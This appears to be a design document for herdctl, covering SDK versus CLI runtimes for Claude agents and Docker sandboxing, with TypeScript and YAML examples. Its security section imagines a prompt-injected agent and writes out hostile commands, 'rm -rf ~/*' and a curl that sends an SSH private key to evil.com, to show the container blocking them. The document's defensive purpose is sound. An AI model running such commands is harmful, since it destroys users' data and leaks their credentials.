# Docker & Runtime Implementation Plan

**Status**: Design Phase
**Last Updated**: 2026-01-31

This document outlines the Docker containerization strategy and runtime abstraction layer for herdctl.

---

## Table of Contents

- [Overview](#overview)
- [Runtime Abstraction](#runtime-abstraction)
- [Docker Strategy](#docker-strategy)
- [Configuration Schema](#configuration-schema)
- [Implementation Details](#implementation-details)
- [Security Model](#security-model)
- [Use Cases](#use-cases)

---

## Overview

herdctl supports two execution strategies:

1. **Runtime Selection**: Choose between Claude Agent SDK (standard pricing) or Claude CLI (Max plan pricing)
2. **Docker Isolation**: Optionally run agents in isolated containers for security

These are orthogonal concerns that can be combined in different ways based on your needs.

### Design Principles

- **Runtime agnostic**: Same interface whether using SDK or CLI
- **Docker optional**: Works with or without containers
- **Security layered**: Multiple isolation levels available
- **Path consistency**: Docker sessions stay in Docker, host sessions stay on host

---

## Runtime Abstraction

### Runtime Interface

All runtimes implement a common interface:

```typescript
/**
 * Agent runtime interface
 *
 * Abstracts the execution backend (SDK vs CLI) behind a common interface
 */
export interface AgentRuntime {
  /**
   * Execute agent and return streaming messages
   *
   * @returns AsyncIterable of SDK messages (same format regardless of runtime)
   */
  run(options: RuntimeOptions): AsyncIterable<SDKMessage>;
}

export interface RuntimeOptions {
  /** The prompt to send to the agent */
  prompt: string;

  /** Resolved agent configuration */
  agent: AgentConfig;

  /** SDK-style options (translated to CLI args if needed) */
  sdkOptions: {
    allowedTools?: string[];
    permissionMode?: PermissionMode;
    settingSources?: string[];
    mcpServers?: Record<string, McpServerConfig>;
    systemPrompt?: string | { type: 'preset'; preset: string };
    resume?: string;
    fork?: boolean;
    cwd?: string;
  };

  /** Workspace directory path */
  workspaceDir: string;

  /** Environment variables to pass */
  envVars?: Record<string, string>;
}
```

### SDK Runtime Implementation

**Location**: `packages/core/src/runner/runtimes/sdk-runtime.ts`

```typescript
/**
 * SDK Runtime - Direct Claude Agent SDK invocation
 *
 * Calls @anthropic-ai/claude-agent-sdk directly in the same process
 */
export class SDKRuntime implements AgentRuntime {
  private sdkQuery: SDKQueryFunction;

  constructor(sdkQuery: SDKQueryFunction) {
    this.sdkQuery = sdkQuery;
  }

  async *run(options: RuntimeOptions): AsyncIterable<SDKMessage> {
    const { prompt, sdkOptions } = options;

    // Direct SDK call
    const messages = this.sdkQuery({ prompt, options: sdkOptions });

    for await (const message of messages) {
      yield message;
    }
  }
}
```

**Characteristics**:
- ✅ Simple, direct invocation
- ✅ No file watching needed
- ✅ True streaming from SDK
- ⚠️ Standard Anthropic API pricing (no Max plan)

### CLI Runtime Implementation

**Location**: `packages/core/src/runner/runtimes/cli-runtime.ts`

```typescript
/**
 * CLI Runtime - Claude CLI invocation with session file watching
 *
 * Spawns `claude -p` command and watches the session file for messages
 */
export class CLIRuntime implements AgentRuntime {
  async *run(options: RuntimeOptions): AsyncIterable<SDKMessage> {
    const { prompt, agent, sdkOptions, workspaceDir, envVars } = options;

    // Build CLI args from SDK options
    const cliArgs = this.buildCLIArgs(prompt, sdkOptions);

    // Spawn claude command
    const claude = spawn('claude', cliArgs, {
      cwd: workspaceDir,
      env: { ...process.env, ...envVars },
    });

    // Extract session ID from stderr
    const sessionId = await this.extractSessionId(claude);

    // Determine session file path based on Docker config
    const sessionFile = this.getSessionFilePath(sessionId, agent);

    // Wait for session file to appear
    await this.waitForFile(sessionFile);

    // Watch session file and yield messages
    yield* this.watchSessionFile(sessionFile);

    // Wait for process to exit
    await this.waitForExit(claude);
  }

  private buildCLIArgs(prompt: string, sdkOptions: Record<string, unknown>): string[] {
    const args = ['-p', prompt];

    // Translate SDK options to CLI flags
    if (sdkOptions.allowedTools) {
      args.push('--allowed-tools', sdkOptions.allowedTools.join(','));
    }

    if (sdkOptions.permissionMode) {
      args.push('--permission-mode', sdkOptions.permissionMode);
    }

    if (sdkOptions.settingSources) {
      args.push('--setting-sources', sdkOptions.settingSources.join(','));
    }

    if (sdkOptions.systemPrompt) {
      if (typeof sdkOptions.systemPrompt === 'string') {
        args.push('--system-prompt', sdkOptions.systemPrompt);
      } else {
        args.push('--preset', sdkOptions.systemPrompt.preset);
      }
    }

    // MCP servers
    for (const [name, config] of Object.entries(sdkOptions.mcpServers || {})) {
      const serverSpec = `${name}=${config.command}:${config.args?.join(' ') || ''}`;
      args.push('--mcp-server', serverSpec);
    }

    // Resume/fork
    if (sdkOptions.resume) {
      args.push('--resume', sdkOptions.resume);
      if (sdkOptions.fork) {
        args.push('--fork');
      }
    }

    return args;
  }

  private async *watchSessionFile(filePath: string): AsyncIterable<SDKMessage> {
    const watcher = watch(filePath);
    let position = 0;

    for await (const event of watcher) {
      if (event.eventType === 'change') {
        const content = await readFile(filePath, 'utf-8');
        const newContent = content.slice(position);
        position = content.length;

        // Parse JSONL
        const lines = newContent.split('\n').filter(l => l.trim());
        for (const line of lines) {
          try {
            yield JSON.parse(line) as SDKMessage;
          } catch (err) {
            // Skip malformed lines
            console.warn('Failed to parse session line:', line);
          }
        }
      }
    }
  }
}
```

**Characteristics**:
- ✅ Max plan pricing (significant cost savings)
- ✅ Full CLI feature parity
- ⚠️ Requires file watching (slight latency)
- ⚠️ Session file management needed

### Runtime Factory

**Location**: `packages/core/src/runner/runtimes/index.ts`

```typescript
export function createRuntime(
  type: 'sdk' | 'cli',
  sdkQuery?: SDKQueryFunction
): AgentRuntime {
  switch (type) {
    case 'sdk':
      if (!sdkQuery) {
        throw new Error('SDK runtime requires sdkQuery function');
      }
      return new SDKRuntime(sdkQuery);

    case 'cli':
      return new CLIRuntime();

    default:
      throw new Error(`Unknown runtime type: ${type}`);
  }
}
```

---

## Docker Strategy

### Chosen Approach: Option 2 (Split Auth & Sessions)

We mount Claude auth files **read-only** and use a **separate session directory** for containers.

#### Rationale

1. **Security**: Container can't corrupt authentication credentials
2. **Clarity**: Docker sessions are isolated from host sessions
3. **Consistency**: Docker sessions reference Docker paths, host sessions reference host paths
4. **Recoverability**: If container misbehaves, auth is protected

#### Session Path Problem

Sessions created in Docker reference container paths:
```jsonl
{"type":"tool_use","name":"Read","input":{"file":"/workspace/config.md"}}
```

If you try to resume this on the host:
```bash
# On host
claude --resume session-xyz

# Claude tries to read: /workspace/config.md
# But on host, file is at: ~/herdctl-workspace/home-lab/config.md
# ❌ PATH MISMATCH
```

**Solution**: Keep Docker sessions separate. They're only resumable within Docker containers (with consistent mounts).

### Docker Mount Strategy

```typescript
// For CLI runtime with Docker
const dockerArgs = [
  'run',
  '--rm',
  '--interactive',

  // Auth files READ-ONLY
  '-v', `${homeDir}/.claude/auth.json:/home/agent/.claude/auth.json:ro`,
  '-v', `${homeDir}/.claude/settings.json:/home/agent/.claude/settings.json:ro`,

  // Sessions in isolated directory
  '-v', `${stateDir}/docker-sessions:/home/agent/.claude/sessions`,

  // Workspace
  '-v', `${workspaceDir}:/workspace`,
  '-w', '/workspace',

  // Additional agent-specific volumes
  ...volumeArgs,

  // Network isolation
  '--network', dockerConfig.network ?? 'none',

  // Resource limits
  '--memory', dockerConfig.memory ?? '2g',
  '--cpus', dockerConfig.cpus ?? '2',

  // Image
  dockerConfig.base_image ?? 'herdctl-base:latest',
];
```

### Directory Structure

```
~/
├── .claude/                          # Host Claude config
│   ├── auth.json                     # Mounted read-only into containers
│   ├── settings.json                 # Mounted read-only into containers
│   └── sessions/                     # Host sessions (NOT mounted)
│       └── session-host-123.jsonl
│
└── .herdctl/                         # herdctl state
    ├── docker-sessions/              # Container sessions (mounted into containers)
    │   └── session-docker-456.jsonl
    └── jobs/
        └── ...
```

### Container Runtime Selection

CLI runtime needs to know where sessions are stored:

```typescript
export class CLIRuntime implements AgentRuntime {
  private getSessionFilePath(sessionId: string, agent: AgentConfig): string {
    if (agent.docker?.enabled) {
      // Docker: sessions in isolated directory
      const stateDir = getStateDir(); // e.g., ~/.herdctl
      return join(stateDir, 'docker-sessions', `${sessionId}.jsonl`);
    } else {
      // Host: sessions in ~/.claude/sessions
      const homeDir = os.homedir();
      return join(homeDir, '.claude', 'sessions', `${sessionId}.jsonl`);
    }
  }
}
```

---

## Configuration Schema

### Agent Config

```yaml
# agents/home-lab.yaml
name: home-lab
description: "Home networking assistant"

# Runtime selection
runtime: cli  # 'sdk' | 'cli' (default: 'sdk')

# Docker configuration
docker:
  enabled: true

  # Base image
  base_image: herdctl-base:latest

  # Network isolation
  network: none  # 'none' | 'bridge' | 'host' (default: 'none')

  # Resource limits
  memory: 2g     # default: '2g'
  cpus: 2        # default: '2'

  # Additional volumes (beyond automatic mounts)
  volumes:
    - ~/network-configs:/configs:ro  # Read-only configs
    - ~/templates:/templates:ro      # Shared templates

# Workspace
workspace: home-lab
repo: you/home-lab-docs

# Permissions (same for both runtimes)
permissions:
  mode: acceptEdits
  allowed_tools:
    - Read
    - Edit
    - Bash
    - Grep
```

### Schema Types

```typescript
// packages/core/src/config/schema.ts

export const RuntimeTypeSchema = z.enum(['sdk', 'cli']);

export const DockerSchema = z.object({
  enabled: z.boolean().optional().default(false),
  base_image: z.string().optional().default('herdctl-base:latest'),
  network: z.enum(['none', 'bridge', 'host']).optional().default('none'),
  memory: z.string().optional().default('2g'),
  cpus: z.string().optional().default('2'),
  volumes: z.array(z.string()).optional().default([]),
});

export const AgentConfigSchema = z.object({
  name: z.string(),
  // ... existing fields ...
  runtime: RuntimeTypeSchema.optional().default('sdk'),
  docker: DockerSchema.optional(),
});
```

---

## Implementation Details

### JobExecutor Integration

```typescript
// packages/core/src/runner/job-executor.ts

export class JobExecutor {
  async execute(options: RunnerOptionsWithCallbacks): Promise<RunnerResult> {
    const { agent, prompt, stateDir } = options;

    // Create runtime based on agent config
    const runtimeType = agent.runtime ?? 'sdk';
    const runtime = createRuntime(runtimeType, this.sdkQuery);

    // Determine execution strategy
    let messageStream: AsyncIterable<SDKMessage>;

    if (agent.docker?.enabled) {
      // Docker execution
      const containerRunner = new ContainerRunner(runtime);
      messageStream = containerRunner.run({
        agent,
        prompt,
        sdkOptions: toSDKOptions({ agent, resume, fork }),
        workspaceDir: resolveWorkspacePath(agent),
        stateDir,
        envVars: this.collectEnvVars(agent),
      });
    } else {
      // Direct execution (no Docker)
      messageStream = runtime.run({
        prompt,
        agent,
        sdkOptions: toSDKOptions({ agent, resume, fork }),
        workspaceDir: resolveWorkspacePath(agent),
        envVars: this.collectEnvVars(agent),
      });
    }

    // Process messages (same for all execution paths)
    for await (const message of messageStream) {
      // ... existing message processing ...
    }
  }
}
```

### ContainerRunner

```typescript
// packages/core/src/runner/container-runner.ts

export class ContainerRunner {
  private runtime: AgentRuntime;

  constructor(runtime: AgentRuntime) {
    this.runtime = runtime;
  }

  async *run(options: ContainerRunnerOptions): AsyncIterable<SDKMessage> {
    const { agent, prompt, sdkOptions, workspaceDir, stateDir, envVars } = options;

    // Build docker args
    const dockerArgs = this.buildDockerArgs({
      agent,
      workspaceDir,
      stateDir,
      envVars,
    });

    // For CLI runtime, we spawn Docker and let runtime handle the rest
    if (agent.runtime === 'cli') {
      // Spawn docker container
      const docker = spawn('docker', dockerArgs, {
        stdio: ['ignore', 'inherit', 'inherit'],
      });

      // Runtime watches session file on host filesystem
      yield* this.runtime.run({
        prompt,
        agent,
        sdkOptions,
        workspaceDir: '/workspace', // Inside container
        envVars,
      });

      await this.waitForExit(docker);
    } else {
      // SDK runtime: Use stdin/stdout communication
      yield* this.runSDKInContainer({
        agent,
        prompt,
        sdkOptions,
        dockerArgs,
      });
    }
  }

  private buildDockerArgs(options: BuildDockerArgsOptions): string[] {
    const { agent, workspaceDir, stateDir, envVars } = options;
    const dockerConfig = agent.docker!;
    const homeDir = os.homedir();

    const args = [
      'run',
      '--rm',
      '--interactive',

      // Workspace
      '-v', `${workspaceDir}:/workspace`,
      '-w', '/workspace',
    ];

    // For CLI runtime: mount auth read-only + session dir
    if (agent.runtime === 'cli') {
      // Auth files read-only
      args.push('-v', `${homeDir}/.claude/auth.json:/home/agent/.claude/auth.json:ro`);

      const settingsPath = join(homeDir, '.claude', 'settings.json');
      if (existsSync(settingsPath)) {
        args.push('-v', `${settingsPath}:/home/agent/.claude/settings.json:ro`);
      }

      // Sessions in isolated directory
      const sessionDir = join(stateDir, 'docker-sessions');
      ensureDirSync(sessionDir);
      args.push('-v', `${sessionDir}:/home/agent/.claude/sessions`);
    }

    // Additional volumes
    for (const volume of dockerConfig.volumes ?? []) {
      args.push('-v', volume);
    }

    // Environment variables
    for (const [key, value] of Object.entries(envVars)) {
      args.push('-e', `${key}=${value}`);
    }

    // Network isolation
    args.push('--network', dockerConfig.network ?? 'none');

    // Resource limits
    if (dockerConfig.memory) {
      args.push('--memory', dockerConfig.memory);
    }
    if (dockerConfig.cpus) {
      args.push('--cpus', dockerConfig.cpus);
    }

    // Image
    args.push(dockerConfig.base_image ?? 'herdctl-base:latest');

    return args;
  }

  private async *runSDKInContainer(options: RunSDKInContainerOptions): AsyncIterable<SDKMessage> {
    // For SDK runtime with Docker: use stdin/stdout protocol
    // (Implementation from previous discussion)
    // ...
  }
}
```

---

## Security Model

### Isolation Layers

| Layer | Without Docker | With Docker | Improvement |
|-------|----------------|-------------|-------------|
| **Filesystem** | Full access | Mounted dirs only | ✅✅✅ |
| **Network** | Full access | None (--network none) | ✅✅✅ |
| **Processes** | Can see all | Isolated namespace | ✅✅ |
| **Auth credentials** | Read/write | Read-only | ✅✅ |
| **Sessions** | Shared | Isolated | ✅ |
| **Environment vars** | All inherited | Explicit only | ✅✅ |

### Attack Surface Analysis

**Scenario**: Prompt injection causes malicious behavior

**Without Docker:**
```bash
# Agent can execute:
rm -rf ~/*
curl https://evil.com --data "$(cat ~/.ssh/id_rsa)"
```
**Result**: ☠️ Catastrophic

**With Docker (our approach):**
```bash
# Agent tries to execute:
rm -rf ~/*           # ✅ BLOCKED - only affects container filesystem
curl evil.com        # ✅ BLOCKED - no network access (--network none)
cat ~/.ssh/id_rsa    # ✅ BLOCKED - ~/.ssh not mounted
```
**Result**: ✅ Contained

**Remaining risks:**
```bash
# Agent CAN:
- Fill disk via /workspace (if mounted read-write)
- Consume CPU/memory (mitigated by --cpus and --memory limits)
- Read files in mounted volumes
```

### Mitigation Strategies

1. **Mount sensitive files read-only**:
   ```yaml
   volumes:
     - ~/configs:/configs:ro  # Can't modify
   ```

2. **Network isolation** (default: `network: none`):
   ```yaml
   docker:
     network: none  # Can't exfiltrate data
   ```

3. **Resource limits**:
   ```yaml
   docker:
     memory: 2g
     cpus: 2
   ```

4. **Read-only auth**:
   ```
   ~/.claude/auth.json mounted read-only
   ```

---

## Use Cases

### Use Case 1: Personal Automation (Cost-Optimized)

```yaml
agents:
  home-lab:
    runtime: cli           # Max plan pricing
    docker:
      enabled: true        # Security
      network: none        # No exfiltration
      volumes:
        - ~/network-docs:/workspace
        - ~/configs:/configs:ro
```

**Benefits**:
- 💰 Save money with Max plan
- 🔒 Container can't access rest of system
- 🔐 Auth protected (read-only)
- ✅ Sessions isolated

### Use Case 2: Development (No Docker)

```yaml
agents:
  dev-agent:
    runtime: sdk           # Standard pricing OK
    docker:
      enabled: false       # Easy debugging
```

**Benefits**:
- 🚀 Simple, fast iteration
- 🐛 Easy to debug (no container layer)
- ✅ Full filesystem access for development

### Use Case 3: Production (Maximum Security)

```yaml
agents:
  production-agent:
    runtime: sdk           # Security > cost
    docker:
      enabled: true
      network: none
      memory: 1g
      cpus: 1
      volumes:
        - /app/data:/data:ro  # Read-only data
```

**Benefits**:
- 🔒 Maximum isolation
- 🔐 No auth file access needed (SDK uses API key)
- ⚡ True streaming (SDK)
- 💪 Production-grade

### Use Case 4: Mixed Fleet

```yaml
# herdctl.yaml
agents:
  # Cheap personal automation
  - path: ./agents/home-lab.yaml      # CLI + Docker
  - path: ./agents/garden.yaml        # CLI + Docker

  # Development agents
  - path: ./agents/dev-coder.yaml     # SDK, no Docker

  # Production agents
  - path: ./agents/prod-api.yaml      # SDK + Docker
```

---

## Next Steps

### Phase 1: Runtime Abstraction (No Docker)
- [ ] Create `AgentRuntime` interface
- [ ] Implement `SDKRuntime`
- [ ] Implement `CLIRuntime` with file watching
- [ ] Add `runtime` field to config schema
- [ ] Update `JobExecutor` to use runtime factory
- [ ] Test both runtimes without Docker

### Phase 2: Docker Support
- [ ] Create base Dockerfile
- [ ] Implement `ContainerRunner`
- [ ] Add Docker config schema
- [ ] Implement mount strategy (auth read-only + session isolation)
- [ ] Test CLI runtime with Docker
- [ ] Test SDK runtime with Docker

### Phase 3: Documentation & Examples
- [ ] Update docs with Docker usage
- [ ] Create example configs for each use case
- [ ] Add security guide
- [ ] Document troubleshooting

### Phase 4: Polish
- [ ] Add config validation (warn about anti-patterns)
- [ ] Improve error messages
- [ ] Add metrics/logging
- [ ] Performance optimization
